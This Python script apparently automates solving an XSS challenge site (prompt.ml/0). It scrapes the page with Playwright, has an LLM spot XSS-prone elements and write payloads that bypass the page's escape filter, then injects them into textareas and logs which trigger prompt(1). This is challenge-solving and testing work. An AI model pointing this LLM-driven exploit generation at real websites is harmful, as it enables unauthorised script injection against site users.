from langgraph.graph import StateGraph, START, END
from typing import TypedDict
import os
import re
from playwright.sync_api import sync_playwright
import requests
import json
from langchain_groq import ChatGroq
from dotenv import load_dotenv

load_dotenv()

groq_api_key = os.getenv("GROQ_API_KEY")
langsmith = os.getenv("LANGSMITH_API_KEY")

os.environ["LANGCHAIN_API_KEY"] = langsmith
os.environ["LANGCHAIN_TRACING_V2"] = "true"
os.environ["LANGCHAIN_PROJECT"] = "CourseLanggraph"

llm = ChatGroq(groq_api_key=groq_api_key, model_name="deepseek-r1-distill-llama-70b")

class State(TypedDict):
    dom_content: str
    risky_elements: list
    payloads: dict
    exploit_results: list

graph_builder = StateGraph(State)

def safe_invoke(prompt):
    response = llm.invoke(prompt)
    match = re.search(r'\{(?:[^{}]|\{(?:[^{}]|\{[^{}]*\})*\})*\}', response.content, re.DOTALL)
    if match:
        try:
            json_data = json.loads(match.group())
            return json_data
        except json.JSONDecodeError:
            return {}
    else:
        return {}

from playwright.sync_api import sync_playwright
import json

def extract_dom(state: State):
    """
    Extracts the full DOM content, including iframe content and scripts, using CDP.
    """
    url = "https://prompt.ml/0"
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            
            page.goto(url)

            main_dom_content = page.content()

            iframe_doms = []
            iframes = page.query_selector_all('iframe')
            for iframe in iframes:
                try:
                    iframe_content = iframe.content_frame().content()
                    iframe_doms.append(iframe_content)
                except:
                    iframe_doms.append("")
            dom_content = {
                "main_page": main_dom_content,
                "iframes": iframe_doms
            }

            browser.close()
            # print(dom_content)
            return {"dom_content": json.dumps(dom_content)}
    except Exception as e:
        print(f"Error extracting DOM: {e}")
        return {"dom_content": ""}


graph_builder.add_node("extract_dom", extract_dom)

def find_risky_elements(state: State):
    dom_content = state["dom_content"]
    if not dom_content:
        return {"risky_elements": []}
    
    prompt = f"""
    Extract a JSON structure listing potential XSS vulnerabilities from the following HTML:
    - Look for instances of `parent.postMessage('message', ...)` without origin validation
    - Identify input fields, textareas, script elements, and event handlers
    - Return JSON in the format: {{"elements": [{{"tag": "<tag>", "location": "<description>"}}]}}
    {dom_content}
    """
    
    risky_elements = safe_invoke(prompt)
    
    try:
        risky_elements = risky_elements.get("elements", [])
        return {"risky_elements": risky_elements}
    except json.JSONDecodeError:
        return {"risky_elements": []}

graph_builder.add_node("find_risky_elements", find_risky_elements)

def generate_payloads(state: State):
    risky_elements = state["risky_elements"]
    dom_content = state["dom_content"]

    if not risky_elements:
        return {"payloads": {"payloads": []}}
    
    prompt = f"""
    Generate JavaScript XSS payloads for the following elements:
    - Analyse the escape function carefully, on how the input should be inorder to return a runnable payload.
    - The DOM content is provided below.
    - The risky elements are identified below.

    Use both the full DOM content and the risky elements to craft the payloads.
    
    Main DOM Content:
    {dom_content}
    
    Risky Elements:
    {risky_elements}

    - Analyze the function `escape(input)` and find ways the payload can bypass validation and be rendered.
    - Ensure payloads execute `prompt(1)` on successful exploitation.
    - Pay special attention to quotation marks and HTML encoding formats to bypass regular expressions.
    - Return the payloads in the format: {{"payloads": [{{"tag": "<tag>", "payload": "<script>"}}]}}
    """
    
    payloads = safe_invoke(prompt)
    
    if isinstance(payloads, dict):
        return {"payloads": payloads.get("payloads", [])}
    return {"payloads": {"payloads": []}}


graph_builder.add_node("generate_payloads", generate_payloads)

def execute_payloads(state: State):
    url = "https://prompt.ml/0"
    payloads = state.get("payloads", [])
    if not payloads:
        return {"exploit_results": []}

    exploit_results = []
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)
            page = browser.new_page()
            page.goto(url)

            for payload in payloads:
                tag = payload["tag"]
                script = payload["payload"]
                
                inputs = page.query_selector_all("textarea")
                for input_field in inputs:
                    input_field.fill(script)
                    input_field.press("Enter")

                try:
                    dialog = page.wait_for_event("dialog", timeout=5000)
                    exploit_results.append({"tag": tag, "status": "Vulnerable", "alert": dialog.message})
                    dialog.dismiss()
                except:
                    exploit_results.append({"tag": tag, "status": "Not Exploitable"})

            browser.close()
    except Exception as e:
        return {"exploit_results": []}

    return {"exploit_results": exploit_results}

graph_builder.add_node("execute_payloads", execute_payloads)

graph_builder.add_edge(START, "extract_dom")
graph_builder.add_edge("extract_dom", "find_risky_elements")
graph_builder.add_edge("find_risky_elements", "generate_payloads")
graph_builder.add_edge("generate_payloads", "execute_payloads")
graph_builder.add_edge("execute_payloads", END)

graph = graph_builder.compile()

initial_state = {"dom_content": "", "risky_elements": [], "payloads": {}, "exploit_results": []}


for event in graph.stream(initial_state):
    pass
